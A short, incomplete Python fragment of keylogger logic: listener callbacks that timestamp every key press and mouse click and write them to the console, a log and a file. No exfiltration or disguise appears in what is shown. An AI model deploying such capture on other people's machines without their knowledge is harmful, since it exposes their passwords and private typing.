...
def on_press(key):
    ...
    try:
        print(f"[{get_time()}]- key: {key.char}")
        logging.info(f"[{get_time()}]- key: {key.char}")
        f.write(f"[{get_time()}]- key: {key.char}")
    except AttributeError:
        print(f"[{get_time()}]- key: {key}")
        logging.info(f"[{get_time()}]- key: {key}")
        f.write(f"[{get_time()}]- key: {key}")

def on_click(x, y, button, pressed):
    if not is_active():
        return False
    if pressed:
        print(f"[{get_time()}]- Mos: {button} at ({x}, {y})")
        logging.info(f"[{get_time()}]- Mos: {button} at ({x}, {y})")
        f.write(f"[{get_time()}]- Mos: {button} at ({x}, {y})")
